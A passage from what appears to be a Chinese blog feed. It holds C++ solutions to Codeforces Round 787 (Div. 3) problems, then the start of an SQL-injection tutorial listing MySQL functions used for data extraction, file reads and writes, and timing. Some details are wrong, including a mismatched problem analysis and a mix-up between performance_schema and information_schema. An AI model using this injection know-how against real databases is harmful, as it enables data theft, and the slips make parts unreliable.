href="#标程-1" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin&gt;&gt;n;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>,&amp;a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> cnt=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=n<span class="number">-1</span>;i&gt;=<span class="number">1</span>;i--)&#123;</span><br><span class="line">        <span class="keyword">while</span>(a[i]&gt;=a[i+<span class="number">1</span>]&amp;&amp;a[i])&#123;</span><br><span class="line">            a[i]/=<span class="number">2</span>;</span><br><span class="line">            cnt++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(a[<span class="number">1</span>]==<span class="number">0</span>&amp;&amp;a[<span class="number">2</span>]==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;-1&quot;</span>);    </span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,cnt);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="C-Detective-Task"><a href="#C-Detective-Task" class="headerlink" title="C. Detective Task"></a>C. Detective Task</h2><h3 id="题目描述-2"><a href="#题目描述-2" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/3.png" alt="3"></p><h3 id="题目分析-2"><a href="#题目分析-2" class="headerlink" title="题目分析"></a>题目分析</h3><p>一开始还以为是逻辑推理题，正面思考无果之后发现一点：当一个人是小偷的时候，这个人前面全为1或者?，后面全为0或者?当遍历第 i 个人的时候，<code>cnt(?|1)=i-1 cnt(?|0)=n-i</code></p><p>如果要判断这个人是不是小偷，只需要看其他人说的全为真话时， 能否证明它是小偷，因此我就不用管它说了什么，直接滚动过去判断就好了。</p><h3 id="标程-2"><a href="#标程-2" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    s[<span class="number">0</span>]=<span class="number">0</span>;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(s+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">int</span> cnt1=<span class="number">0</span>,cnt0=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>||s[i]==<span class="string">&#x27;0&#x27;</span>)cnt0++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> ans=<span class="number">0</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=len;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==<span class="string">&#x27;?&#x27;</span>||s[i]==<span class="string">&#x27;0&#x27;</span>)&#123;</span><br><span class="line">            cnt0--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(s[i<span class="number">-1</span>]==<span class="string">&#x27;?&#x27;</span>||s[i<span class="number">-1</span>]==<span class="string">&#x27;1&#x27;</span>)&#123;</span><br><span class="line">            cnt1++;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(cnt0==len-i&amp;&amp;cnt1==i<span class="number">-1</span>)&#123;</span><br><span class="line">            ans++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>,ans);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="D-Insert-a-Progression"><a href="#D-Insert-a-Progression" class="headerlink" title="D. Insert a Progression"></a>D. Insert a Progression</h2><h3 id="题目描述-3"><a href="#题目描述-3" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/4.png" alt="4"></p><h3 id="题目分析-3"><a href="#题目分析-3" class="headerlink" title="题目分析"></a>题目分析</h3><p>树链剖分板题，而且只要轻重链剖分完了就可以直接输出了。</p><h3 id="标程-3"><a href="#标程-3" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> int long long</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">int</span> a[<span class="number">200005</span>];</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n,x;</span><br><span class="line">    cin&gt;&gt;n&gt;&gt;x;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        cin&gt;&gt;a[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> max_x=a[<span class="number">1</span>],min_x=a[<span class="number">1</span>],ans=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">2</span>;i&lt;=n;i++)&#123;</span><br><span class="line">        ans+=<span class="built_in">abs</span>(a[i]-a[i<span class="number">-1</span>]);</span><br><span class="line">        max_x=<span class="built_in">max</span>(max_x,a[i]);</span><br><span class="line">        min_x=<span class="built_in">min</span>(min_x,a[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    ans+=<span class="built_in">min</span>((min_x<span class="number">-1</span>)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(a[<span class="number">1</span>]<span class="number">-1</span>),<span class="built_in">abs</span>(a[n]<span class="number">-1</span>)));</span><br><span class="line">    <span class="keyword">if</span>(x&gt;max_x)&#123;</span><br><span class="line">        ans+=<span class="built_in">min</span>((x-max_x)*<span class="number">2</span>,<span class="built_in">min</span>(<span class="built_in">abs</span>(x-a[<span class="number">1</span>]),<span class="built_in">abs</span>(x-a[n])));</span><br><span class="line">    &#125;</span><br><span class="line">    cout&lt;&lt;ans&lt;&lt;endl;</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="E-Replace-With-the-Previous-Minimize"><a href="#E-Replace-With-the-Previous-Minimize" class="headerlink" title="E. Replace With the Previous, Minimize"></a>E. Replace With the Previous, Minimize</h2><h3 id="题目描述-4"><a href="#题目描述-4" class="headerlink" title="题目描述"></a>题目描述</h3><p><img src="/2022/05/06/Codeforces%20Round%20787(Div.3)/5.png" alt="5"></p><h3 id="题目分析-4"><a href="#题目分析-4" class="headerlink" title="题目分析"></a>题目分析</h3><p>这题有点小意思，意思就是一次操作能把一个字符串的所有特定字符变小 <code>1</code>，问你 <code>k</code> 次操作生成的字典序最小的字符串是什么。首先有一点肯定没错，就是我无脑把前面不是 <code>a</code> 的字符先都变 <code>a</code> 了肯定不会有问题。但是有一点需要考虑，那就是先变前面，如果后面还有比这个大一点的，那就又需要很多次才能变成 <code>a</code> 了，所以我们的思路就是收集所有能在 <code>k</code> 次范围内变成 <code>a</code> 的字符，从左到右遍历，显而易见，k&gt;=25则一定可以达到全 <code>a</code> 的状态。遇到了不能在 <code>k</code> 次变成 <code>a</code> 的字符之后，把前面取得的最大次数先用掉，如果次数有剩余，无脑给那一个字符即可。</p><h3 id="标程-4"><a href="#标程-4" class="headerlink" title="标程"></a>标程</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxn 200005</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> maxx 40005</span></span><br><span class="line"><span class="comment">//#define int long long</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> OK &#123;puts(<span class="meta-string">&quot;YES&quot;</span>);&#125;</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NO &#123;puts(<span class="meta-string">&quot;NO&quot;</span>);return;&#125;</span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="keyword">char</span> s[maxn];</span><br><span class="line"><span class="keyword">int</span> n,k;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change</span><span class="params">(<span class="keyword">char</span> ch)</span></span>&#123;</span><br><span class="line">    <span class="comment">//putchar(ch);putchar(10);</span></span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]==ch)s[i]--;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//printf(&quot;%s\n&quot;,s);</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">solve</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    cin&gt;&gt;n&gt;&gt;k;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>,s);</span><br><span class="line">    <span class="keyword">if</span>(k&gt;=<span class="number">25</span>)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> q=<span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> flag=<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;n;i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s[i]-<span class="string">&#x27;a&#x27;</span>&gt;k)&#123;</span><br><span class="line">            <span class="keyword">int</span> th=k-q;</span><br><span class="line">            <span class="keyword">char</span> cc=s[i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;th;j++)&#123;</span><br><span class="line">                <span class="comment">//printf(&quot;%d &quot;,j);</span></span><br><span class="line">                <span class="comment">//putchar(cc-j);</span></span><br><span class="line">                <span class="built_in">change</span>(cc-j);</span><br><span class="line">                <span class="comment">//putchar(s[i]-j);putchar(10);</span></span><br><span class="line">                </span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=q;j&gt;=<span class="number">1</span>;j--)&#123;</span><br><span class="line">                <span class="built_in">change</span>(<span class="string">&#x27;a&#x27;</span>+j);</span><br><span class="line">            &#125;</span><br><span class="line">            flag=<span class="number">0</span>;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">            </span><br><span class="line">        &#125;</span><br><span class="line">        q=<span class="built_in">max</span>(q,s[i]-<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        <span class="comment">//printf(&quot;%d\n&quot;,q);</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>(flag)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=n;i++)&#123;</span><br><span class="line">            <span class="built_in">putchar</span>(<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">putchar</span>(<span class="number">10</span>);</span><br><span class="line">        <span class="keyword">return</span> ;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,s);</span><br><span class="line">    </span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">init</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125; </span><br><span class="line"><span class="function"><span class="keyword">signed</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">ifndef</span> ONLINE_JUDGE</span></span><br><span class="line">        <span class="built_in">freopen</span>(<span class="string">&quot;1.in&quot;</span>,<span class="string">&quot;r&quot;</span>,stdin);</span><br><span class="line">    <span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">    <span class="keyword">int</span> t=<span class="number">1</span>;</span><br><span class="line">    cin&gt;&gt;t;</span><br><span class="line">    <span class="built_in">init</span>();</span><br><span class="line">    <span class="keyword">while</span>(t--)<span class="built_in">solve</span>();</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>现在 rating 还没出来，不知道能不能蓝，不过我知道如果 A 不失误是一定有机会蓝名的，下次再接再厉吧。</p>]]></content>
      
      
      <categories>
          
          <category> icpc </category>
          
          <category> codeforces </category>
          
          <category> 题解 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql注入总结</title>
      <link href="/2022/05/04/sql%E6%B3%A8%E5%85%A5/"/>
      <url>/2022/05/04/sql%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>sql学了也有一段时间了，想着把能用到的知识点都写一遍好。</p><span id="more"></span><p>先瞎jb扯几句</p><h2 id="WEB框架"><a href="#WEB框架" class="headerlink" title="WEB框架"></a>WEB框架</h2><p><code>web</code>应用一改我们平时常见的 <code>p2p</code> 和 <code>C/S</code> 模式，采用 <code>B/S</code> 模式。随着网络技术的发展，特别随着Web技术的不断成熟，B/S 这种软件体系结构出现了。<strong>浏览器-服务器（Browser/Server）结构</strong>，简称 <code>B/S</code> 结构，与 <code>C/S</code>不同，其客户端不需要安装专门的软件，只需要浏览器即可，浏览器与Web服务器交互，Web服务器与后端数据库进行交互，可以方便地在不同平台下工作。</p><p>比如我们玩的英雄联盟就是典型的 <code>C/S</code> 结构的服务，因为有大量图片资源和 <code>3D</code> 模型存储在本地，因此提前安装好客户端就可以方便地与服务器进行交互，如果采用 <code>B/S</code> 结构的话，在我们游戏开始的时候就要与服务器建立连接，下载好各种资源到本地，然后再与服务器进行交互，各种页游均是 <code>B/S</code> 结构。<code>B/S</code> 的优势就是对需要服务一方的电脑要求较低，很容易可以兼容系统上的差异，客户往往只需要安装浏览器便可以享受全部的  <code>web</code> 服务。<code>web</code> 应用会先向我们的浏览器发送前端语言 <code>javascript</code> 或者 <code>html</code> 给浏览器解析执行，我们经过一定的操作之后会向服务器发送请求，然后服务器根据我们的请求做出不同的答复，这个答复还是前端语言形成的网页。</p><p>服务器会根据什么规则去响应请求，这个就要用到后端语言了，如 <code>php</code>,<code>aspx</code> 等都是常见的后端语言，现在以 <code>php</code> 为主。比如我们实现一个登录页面，那么这个登录肯定是会用到数据库查询操作的，我们将请求提交给服务器之后，后端语言得到我们发送的数据，然后后端语言就会相应地构造 <code>sql</code> 语句去执行数据库查询，并根据查询结果来响应我们</p><p>那么我们很清晰了，我们负责发送数据，<code>php</code> 构造 <code>sql</code> 语句去查询。首先明白一点，<code>sql</code> 语句肯定我们能控制，因为我输入什么它就要去查什么。我们的输入一定会被嵌入 <code>sql</code> 语句。如果我们在 <code>sql</code> 中能输入任意内容，那我就相当于直接控制了整个数据库。<code>sql</code> 注入的就这么产生了，带来的本质危害也就是数据库信息泄露，如果数据库配置权限过高甚至能让攻击者拿到 <code>shell</code>。</p><h2 id="sql语言"><a href="#sql语言" class="headerlink" title="sql语言"></a>sql语言</h2><p><code>SQL</code>(<code>Structured Query Language</code>，结构化查询语言)是一种特定目的程式语言，用于管理关系数据库管理系统（<code>RDBMS</code>），或在关系流数据管理系统（<code>RDSMS</code>）中进行流处理。<br><code>SQL</code>基于关系代数和元组关系演算，包括一个数据定义语言和数据操纵语言。<code>SQL</code>的范围包括数据插入、查询、更新和删除，数据库模式创建和修改，以及数据访问控制。尽管<code>SQL</code>经常被描述为，而且很大程度上是一种声明式编程（<code>4GL</code>），但是其也含有过程式编程的元素。(from wiki)</p><p>我们最常用的数据库系统是<code>mysql</code>。</p><h2 id="Mysql常用函数"><a href="#Mysql常用函数" class="headerlink" title="Mysql常用函数"></a>Mysql常用函数</h2><h3 id="数据库基本信息函数"><a href="#数据库基本信息函数" class="headerlink" title="数据库基本信息函数"></a>数据库基本信息函数</h3><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>user()</td><td>用户名</td></tr><tr><td>system_user()</td><td>系统用户名</td></tr><tr><td>curent_user()</td><td>前用户名</td></tr><tr><td>session_user()</td><td>连接数据库的用户名</td></tr><tr><td>database()</td><td>当前选择的数据库</td></tr><tr><td>version()</td><td>数据库版本</td></tr><tr><td>@@data_dir()</td><td>数据库路径</td></tr><tr><td>@@base_dir()</td><td>数据库安装路径</td></tr><tr><td>@@version_compile_os</td><td>操作系统</td></tr></tbody></table><p>注意，这些函数都无参数且在使用时必须使用 <code>select</code> 关键字输出。</p><h3 id="字符串处理函数"><a href="#字符串处理函数" class="headerlink" title="字符串处理函数"></a>字符串处理函数</h3><p>在sql中，字符串通常使用一对单引号表示。</p><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>concat(s1,s2,s3…)</td><td>无任何分隔地连接字符串</td></tr><tr><td>concat_ws(char,s1,s2,s3…)</td><td>有分隔地连接字符串</td></tr><tr><td>group_concat(s1)</td><td>连接s1列的所有记录并逗号分隔</td></tr><tr><td>load_file(file)</td><td>读取文件</td></tr><tr><td>into outfile ‘file’</td><td>写文件</td></tr><tr><td>ascii(str)</td><td>字符串的ASCII码值</td></tr><tr><td>ord(str)</td><td>返回字符串第一个字符的ASCI值</td></tr><tr><td>mid(str,start,length)</td><td>返回一个字符串的一部分</td></tr><tr><td>substr(str,start,length)</td><td>返回一个字符串的一部分</td></tr><tr><td>length(str)</td><td>返回字符串长度</td></tr><tr><td>left(str,length)</td><td>返回字符串的前缀</td></tr><tr><td>rigth(str,length)</td><td>返回字符串的后缀</td></tr></tbody></table><h3 id="sql注入常用函数"><a href="#sql注入常用函数" class="headerlink" title="sql注入常用函数"></a>sql注入常用函数</h3><table><thead><tr><th>函数名</th><th>功能</th></tr></thead><tbody><tr><td>extractvalue(xml,Xpath)</td><td>使用 XPathtable 示法从 XML 字符串中提取值</td></tr><tr><td>UpdateXML(xml,Xpath,replacement)</td><td>返回替换的 XML 片段</td></tr><tr><td>sleep(sec)</td><td>程序休眠对应秒数</td></tr><tr><td>if(expression,truepart,falsepart)</td><td>如果表达式为真返回第二个参数，否则返回第三个参数</td></tr><tr><td>char()</td><td>返回整数ASCII代码字符组成的字符串</td></tr><tr><td>strcmp(str1,str2)</td><td>比较两个字符串str1&gt;str2返回1，相等返回0，否则返回-1</td></tr><tr><td>IFNULL(arg1,arg2)</td><td>参数1不为NULL返回参数1，否则返回参数2</td></tr><tr><td>exp(pow)</td><td>返回e的指数幂</td></tr></tbody></table><h2 id="Mysql内置数据库"><a href="#Mysql内置数据库" class="headerlink" title="Mysql内置数据库"></a>Mysql内置数据库</h2><ul><li><code>Mysql</code>：保存账户信息，权限信息，存储过程，event，时区等信息</li><li><code>sys</code>：包含了一系列的存储过程、自定义函数以及视图来帮助我们快速的了解系统的元数据信息。（元数据是关于数据的数据，如数据库名或表名，列的数据类型，或访问权限等）</li><li><code>performance_schema</code>：用于收集数据库服务器性能参数</li><li><code>information_schema</code>：它提供了访问数据库元数据的方式。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表的数据类型与访问权限等。</li></ul><p>这里看似很复杂，实际上你只需要知道这个 <code>performance_schema</code> 数据库就可以了。对于一个未知的数据库，我们首先需要知道它的数据库名，数据表名，知道表名之后还得知道字段名，这样我们才能使用类似这样的 <code>sql</code> 语句 <code>select 字段名 from  数据库.表名;</code> 去泄露数据库的具体信息。</p><p>我们 <code>navicat</code> 打开这个数据库观察一下有什么表</p><p><img src="/2022/05/04/sql%E6%B3%A8%E5%85%A5/1.png" alt="1"> 